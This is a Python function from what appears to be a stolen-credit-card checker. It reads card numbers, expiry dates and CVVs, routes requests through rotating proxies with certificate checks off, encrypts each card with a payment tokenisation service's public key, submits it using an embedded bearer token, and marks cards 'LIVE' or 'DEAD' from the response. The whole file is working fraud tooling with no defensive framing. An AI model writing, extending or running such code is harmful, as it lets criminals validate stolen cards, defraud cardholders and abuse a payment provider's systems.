def check_single_card(card_line, proxy_pool):
    parts = card_line.split("|")
    if len(parts) < 3:
        return 2, "ERROR", "Invalid format (cc|mo|yr|cvv)"
    
    cc, mo, yr = parts[0].strip(), parts[1].strip(), parts[2].strip()
    cvv = parts[3].strip() if len(parts) > 3 else ""
    expiry = f"{mo}/{yr[-2:]}"
    card_type = "visa" if cc.startswith("4") else "mastercard"

    session = requests.Session()
    session.trust_env = False
    p_dict = proxy_pool.next() if proxy_pool else None

    try:
        # 1. Get Public Keys
        r = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", 
                        headers={"Authorization": f"Bearer {INLINE_BEARER_TOKEN}", "User-Agent": UA}, 
                        proxies=p_dict, timeout=10, verify=False)
        if r.status_code != 200:
            return 2, "ERROR", f"HTTP {r.status_code} (Token/Proxy issue)"
        
        keys = r.json().get("list", [])
        if not keys:
            return 2, "ERROR", "No public keys"
        key_entry = random.choice(keys)

        # 2. Encrypt Payload
        payload = {"ch_name": "", "cc_num": cc, "card_type": card_type, "card_date": expiry, "ch_country": "US"}
        if cvv: payload["card_cvv"] = cvv

        mod_hex = key_entry["modulus"].replace(":", "")
        exp_int = int(key_entry["exponent"])
        exp_hex = format(exp_int, "x")
        if len(exp_hex) % 2 != 0: exp_hex = "0" + exp_hex

        jwk = {
            "kty": "RSA",
            "n": base64url_encode(bytes.fromhex(mod_hex)).decode("ascii"),
            "e": base64url_encode(bytes.fromhex(exp_hex)).decode("ascii"),
        }
        jwe_token = jwe.encrypt(json.dumps(payload).encode("utf-8"), jwk, encryption="A128CBC-HS256", algorithm="RSA-OAEP").decode("ascii")

        # 3. Authenticate
        r2 = session.post(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate",
                          headers={"Authorization": f"Bearer {INLINE_BEARER_TOKEN}", "Content-Type": "application/json", "User-Agent": UA},
                          json={"key_id": key_entry["id"], "encrypted_payment_data": jwe_token, "payment_token_type": "CARD_DATA", "save_card": False},
                          proxies=p_dict, timeout=10, verify=False)
        
        # Safe text encoding handling to prevent latin-1 codec crashes
        try:
            res_data = r2.json()
        except Exception:
            res_data = {"status": "ERROR", "state": "ERROR"}

        status = str(res_data.get("status") or res_data.get("state") or "").upper()
        
        if status in ("FAILED", "DECLINED", "REJECTED", "ERROR", "UNAUTHENTICATED"):
            return 1, "DEAD", f"CARD_DECLINED ({status})"
        
        auth_id = res_data.get("authentication_id")
        if not auth_id:
            return 1, "DEAD", "CARD_DECLINED"

        # 4. Get Payment Token
        r3 = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
                       headers={"Authorization": f"Bearer {INLINE_BEARER_TOKEN}", "User-Agent": UA},
                       proxies=p_dict, timeout=10, verify=False)
        
        try:
            tok_data = r3.json()
        except Exception:
            tok_data = {}

        tok_status = str(tok_data.get("status") or tok_data.get("state") or "").upper()

        if tok_status in ("FAILED", "DECLINED", "REJECTED", "ERROR"):
            return 1, "DEAD", f"CARD_DECLINED ({tok_status})"

        if tok_data.get("authenticated_payment_token"):
            return 0, "LIVE", "APPROVED"
        
        return 1, "DEAD", "DECLINED"

    except Exception as e:
        err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
        return 2, "ERROR", err_msg or "Encoding Exception"
